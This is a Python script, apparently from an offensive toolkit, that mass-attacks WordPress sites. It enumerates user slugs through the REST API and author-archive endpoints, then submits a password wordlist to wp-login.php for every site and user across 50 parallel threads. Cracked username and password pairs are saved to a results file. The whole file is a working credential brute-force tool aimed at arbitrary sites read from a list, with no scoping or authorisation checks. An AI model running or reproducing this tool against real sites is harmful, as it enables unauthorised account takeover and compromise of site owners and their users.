from assets.colors.colors import colors
import requests
import os
from concurrent.futures import ThreadPoolExecutor

def getFile(files):
    with open(files, 'r') as f:
        return f.read().splitlines()

def get_usernames(wordpress_url):
    api_urls = [
        f"{wordpress_url}/wp-json/wp/v2/users",
        f"{wordpress_url}/?author=1"
    ]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
    }

    for api_url in api_urls:
        try:
            response = requests.get(api_url, headers=headers, verify=True)
            response.raise_for_status()
            users = response.json()
            usernames = [user['slug'] for user in users]
            if usernames:
                return usernames
        except requests.exceptions.RequestException as e:
            print(f"Failed to fetch usernames from API: {api_url}. Error: {e}")

    print("Both APIs failed to fetch usernames.")
    manual_input = input("Enter your username: ")
    if manual_input:
        return [manual_input]
    else:
        return []

def login_to_wordpress(wordpress_url, username, password, results_file):
    session = requests.Session()
    login_url = f"{wordpress_url}/wp-login.php"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
    }
    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In'
    }
    try:
        login_response = session.post(login_url, data=payload, headers=headers, verify=True)
        login_response.raise_for_status()
        if 'login_error' not in login_response.text:
            result = f"{wordpress_url} {username} => {password}"
            with open(results_file, 'a') as file:
                file.write(result + '\n')
            print(f"[{colors.green}✔{colors.reset}] Login successful for {colors.green}{username} => {password}{colors.reset}")
        else:
            print(f"[{colors.red}✗{colors.reset}] Login failed for {colors.red}{username} => {password}{colors.reset}")
    except requests.exceptions.RequestException as e:
        print(f"Login request failed. Error: {e}")

def wpExp():
    list_sites_file = input(f"{colors.magenta}ETHOPIA ( WORDPRESS BRUTE FORCE ) => {colors.reset}")
    list_sites = getFile(list_sites_file)
    if not list_sites:
        print("No list of sites found.")
        return
    
    usernames = []
    for wordpress_url in list_sites:
        users = get_usernames(wordpress_url)
        if users:
            usernames.extend(users)
            print(f"Extracted usernames for {colors.cyan}{wordpress_url}{colors.reset}:")
            for username in users:
                print(username)
        else:
            print(f"No usernames found for {colors.cyan}{wordpress_url}{colors.reset}")

    if not usernames:
        print("No usernames found.")
        return

    password_file = input("Input your password list => ")
    print("Trying login to the following sites:")
    for wordpress_url in list_sites:
        print(f"{colors.cyan}{wordpress_url}{colors.reset}")

    with open(password_file, 'r', encoding="utf-8") as f:
        passwords = f.readlines()

    results_file = "result/wpLogin.txt"
    if not os.path.exists("result"):
        os.makedirs("result")
    def brute_force_login(wordpress_url, username, password):
        login_to_wordpress(wordpress_url, username, password, results_file)
    with ThreadPoolExecutor(max_workers=50) as executor:
        for wordpress_url in list_sites:
            for password in passwords:
                password = password.strip()
                for username in usernames:
                    executor.submit(brute_force_login, wordpress_url, username, password)

    print(f"Results saved to {results_file}")

if __name__ == '__main__':
    wpExp()
